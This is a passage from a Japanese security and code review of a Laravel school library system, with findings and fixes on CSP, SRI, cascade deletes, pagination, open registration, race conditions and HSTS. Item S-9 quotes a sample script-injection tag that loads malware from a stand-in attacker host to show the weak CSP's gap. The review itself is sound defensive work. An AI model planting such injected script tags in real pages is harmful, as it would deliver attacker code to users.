### S-8. ユーザー削除時に貸出履歴がCASCADE削除される

**何が問題か：**
`loans` テーブルの `user_id` 外部キーに `onDelete('cascade')` が設定されている。
ユーザーがプロフィール画面から自分のアカウントを削除すると、
そのユーザーの全貸出記録が連鎖的に削除される。

**該当コード：**
```php
// database/migrations/2025_07_22_134932_create_loans_table.php:16
$table->foreignId('user_id')->constrained()->onDelete('cascade');
```

**なぜ危険か：**
- ユーザーが本を借りたままアカウントを削除 → 貸出記録が消える → **本が行方不明になる**
- 管理者は「誰がいつ借りたか」の記録を確認できなくなる
- 書籍にはSoftDeletesを導入済みだが、貸出記録は物理削除される矛盾

**修正方針：**
2段階で対処する：

1. アカウント削除時に「貸出中の本がある場合は削除を拒否する」チェックを追加：
```php
// app/Http/Controllers/ProfileController.php — destroy() に追加
$activeLoanCount = auth()->user()->loans()
    ->where('status', Loan::STATUS_BORROWED)->count();
if ($activeLoanCount > 0) {
    return back()->with('error', '貸出中の本があるため、アカウントを削除できません。先に返却してください。');
}
```

2. 将来的に `onDelete('cascade')` を `onDelete('restrict')` に変更する
  （マイグレーションで外部キー制約を変更）

**該当ファイル：**
- `database/migrations/2025_07_22_134932_create_loans_table.php` — 16行目
- `app/Http/Controllers/ProfileController.php` — `destroy()` メソッド

---

### S-9. CSPヘッダーが実質的に無効化されている

**何が問題か：**
Content-Security-Policy ヘッダーの `default-src` に `http: https:` が含まれており、
**インターネット上のあらゆるオリジンからのリソース読み込みを許可**している。
さらに `'unsafe-inline'` と `'unsafe-eval'` も許可されているため、CSPとして機能していない。

**現在の設定：**
```
Content-Security-Policy: default-src 'self' http: https: data: blob: 'unsafe-inline' 'unsafe-eval'
```

さらに、同じヘッダーが **Nginx設定（`default.conf.template`）とPHPミドルウェア（`SecurityHeadersMiddleware`）の
2箇所で設定されている**ため、レスポンスにCSPヘッダーが**重複**して含まれる。

**なぜ問題か：**
- `http: https:` があると `<script src="https://evil.com/malware.js">` のインジェクションを防げない
- `'unsafe-inline'` があるとインラインスクリプト注入を防げない
- CSPの本来の目的（XSS攻撃の緩和）が達成されていない
- ヘッダー重複はブラウザの挙動が不安定になる原因

**修正方針：**
1. CSPヘッダーは**ミドルウェアのみ**で設定し、Nginx側は削除する
2. Alpine.js v3には `'unsafe-eval'` が必要なのでこれは残す
3. 必要なオリジンだけをホワイトリストに入れる：

```
default-src 'self';
script-src 'self' 'unsafe-eval' https://unpkg.com;
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
img-src 'self' data: https://api.openbd.jp https://cover.openbd.jp;
connect-src 'self';
```

**該当ファイル：**
- `app/Http/Middleware/SecurityHeadersMiddleware.php` — 19行目
- `docker/nginx/default.conf.template` — 12行目
- `docker/nginx/default.conf` — 12行目

---

### S-10. 外部CDNスクリプトにSRI（整合性チェック）がない

**何が問題か：**
2つの外部JavaScriptライブラリが `unpkg.com` から直接読み込まれているが、
SRI（Subresource Integrity）ハッシュが指定されていない。
また Alpine.js のバージョンが `@3.x.x` と固定されていない。

**現在のコード（危険）：**
```html
<!-- books/index.blade.php:2 — バージョン未固定 -->
<script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>

<!-- isbn-scan.blade.php:2 — バージョンもSRIもなし -->
<script src="https://unpkg.com/html5-qrcode"></script>
```

**なぜ危険か：**
- `unpkg.com` が侵害された場合、悪意のあるスクリプトが全ユーザーに配信される
- `@3.x.x` はメジャーバージョン3の最新版を自動取得するため、
  破壊的変更を含むバージョンが突然読み込まれる可能性がある
- SRIがないため、ファイル内容が改ざんされてもブラウザは検知できない

**さらに：** Alpine.js は `resources/js/app.js` でも読み込まれている（npm経由）。
`books/index.blade.php` のCDN版は**二重読み込み**になっている可能性が高い。

**修正方針：**
1. Alpine.js: npm版で統一し、CDN版の `<script>` タグを削除する
2. html5-qrcode: npm でインストールして Vite でバンドルする、
   またはバージョン固定 + SRIハッシュ付きで読み込む：
```html
<script src="https://unpkg.com/html5-qrcode@2.3.8/html5-qrcode.min.js"
        integrity="sha384-xxxx..."
        crossorigin="anonymous"></script>
```

**該当ファイル：**
- `resources/views/books/index.blade.php` — 2行目
- `resources/views/isbn-scan.blade.php` — 2行目

---

### S-11. 全件取得 `get()` の多用（ページネーションなし）

**何が問題か：**
複数のコントローラメソッドが `paginate()` ではなく `get()` を使っており、
該当テーブルの全レコードをメモリに読み込んでいる。

**該当箇所：**

| コントローラ | メソッド | 問題のコード | 影響 |
|---|---|---|---|
| `LoanController` | `index()` | `->get()` (27行目) | 全貸出記録を取得 |
| `LoanController` | `overdue()` | `->get()` (110行目) | 全延滞記録を取得 |
| `LoanController` | `myLoans()` | `->get()` (120行目) | ユーザーの全貸出を取得 |
| `Admin\UserController` | `index()` | `->get()` (17行目) | 全ユーザーを取得 |
| `BookController` | `show()` | `->get()` (128行目) | 書籍の全貸出履歴を取得 |

**なぜ問題か：**
- 学校図書室の規模（100-500冊）では当面問題にならないかもしれない
- しかし貸出記録は年間数百件ずつ増え続ける（返却済みも含む）
- 3年運用で数千件 → Loan `index()` が数千レコードを一度に取得 → レスポンス劣化
- Render無料プラン（メモリ512MB）ではOOMのリスク

**修正方針：**
`get()` を `paginate()` に変更する。Bladeテンプレート側にも `{{ $loans->links() }}` を追加：

```php
// 例: LoanController::index()
$loans = Loan::with(['user', 'book'])
    ->orderBy($sort, $direction)
    ->paginate(20);  // ← get() から paginate(20) に変更
```

`myLoans()` はユーザーが同時に借りる冊数が少ない（通常10冊以下）ため、
`get()` のままでも実害は少ないが、一貫性のために `paginate()` にしてもよい。

**該当ファイル：**
- `app/Http/Controllers/LoanController.php` — 27, 110, 120行目
- `app/Http/Controllers/Admin/UserController.php` — 17行目
- `app/Http/Controllers/BookController.php` — 128行目
- 各対応するBladeテンプレート（ページネーションリンクの追加）

---

### S-12. ユーザー登録がオープン（誰でも登録可能）

**何が問題か：**
登録ページ（`/register`）が誰でもアクセス可能で、制限なくアカウントを作成できる。
学校図書管理システムとして、関係者以外がアクセス・利用できる状態は適切でない。

**なぜ問題か：**
- 無関係の第三者がアカウントを作成し、書籍を借りることができる
- S-3（role mass assignment）と組み合わせると管理者権限まで取得可能
- スパムアカウントの大量作成が可能

**修正方針（段階的）：**

**案A（最小）：** 登録を無効化し、管理者がアカウントを手動作成する
```php
// routes/auth.php — 登録ルートをコメントアウトまたは削除
// Route::get('register', ...);
// Route::post('register', ...);
```
管理者画面にユーザー作成機能を追加する。

**案B（招待制）：** 招待コード方式
登録フォームに招待コード入力欄を追加し、管理者が発行したコードを知っている人だけが登録可能にする。

**案C（ドメイン制限）：** メールドメインで制限
`@school.ed.jp` のような学校ドメインのメールアドレスのみ登録可能にする。

**該当ファイル：**
- `routes/auth.php` — 登録ルート（15-18行目）

---

### S-13. copy_number の採番にレースコンディションがある

**何が問題か：**
書籍登録時の `copy_number` 採番が、トランザクションやロックなしで行われている。
2人の管理者が同時に同じISBNの書籍を登録すると、同じ `copy_number` が割り当てられる可能性がある。

**現在のコード（問題）：**
```php
// app/Http/Controllers/BookController.php:58-59
$maxCopy = Book::where('isbn', $request->isbn)->max('copy_number') ?? 0;
$copyNumber = $maxCopy + 1;
// ← 別のリクエストが同じ max を取得する可能性
$book = Book::create([..., 'copy_number' => $copyNumber]);
```

**なぜ問題か：**
- 2冊目が2つ存在する（copy_number=2 が重複）
- `isbn` + `copy_number` のユニーク制約があればDBエラーになるが、ユーザーには分かりにくいエラーになる

**修正方針：**
トランザクション + 排他ロックで囲む（`borrow()` と同じパターン）：

```php
return DB::transaction(function () use ($request) {
    $maxCopy = Book::where('isbn', $request->isbn)
        ->lockForUpdate()
        ->max('copy_number') ?? 0;
    $copyNumber = $maxCopy + 1;
    $book = Book::create([..., 'copy_number' => $copyNumber]);
    return redirect()->route('books.index')->with('success', ...);
});
```

**該当ファイル：**
- `app/Http/Controllers/BookController.php` — `store()` メソッド（57-59行目）

---

### S-14. HSTSヘッダーが設定されていない

**何が問題か：**
本番サイトはHTTPSで提供されているが、`Strict-Transport-Security`（HSTS）ヘッダーが設定されていない。
初回アクセス時にHTTPでアクセスした場合、HTTPSにリダイレクトされるまでの通信が暗号化されない。

**修正方針：**
`SecurityHeadersMiddleware` に追加する：

```php
if (app()->environment('production')) {
    $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
}
```

**該当ファイル：**
- `app/Http/Middleware/SecurityHeadersMiddleware.php`

---

### 🟡 MEDIUM（改善すべきだが緊急ではない）

---

### S-16. ISBNスキャンページにadminミドルウェアを追加する

**何が問題か：**
`/isbn-scan` ルートが `auth` ミドルウェアのみで保護されており、一般ユーザーもアクセスできる。
ISBNスキャンは書籍登録のための機能であり、管理者のみが使用すべき。

**該当ファイル：**
- `routes/web.php` — 28行目

**修正方針：**
`/isbn-scan` を `admin` ミドルウェアのグループに移動する。

---

### S-15. Livewireが依存関係に含まれているが未使用

**何が問題か：**
`composer.json` に `livewire/livewire: ^3.6` が含まれているが、
コードベース全体でLivewireコンポーネントが一つも使われていない。

**影響：**
- `composer install` の時間が増える
- Dockerイメージのサイズが増える
- Livewireのサービスプロバイダが毎リクエスト読み込まれるオーバーヘッド

**修正方針：**
```bash
composer remove livewire/livewire
```

**該当ファイル：**
- `composer.json` — 12行目
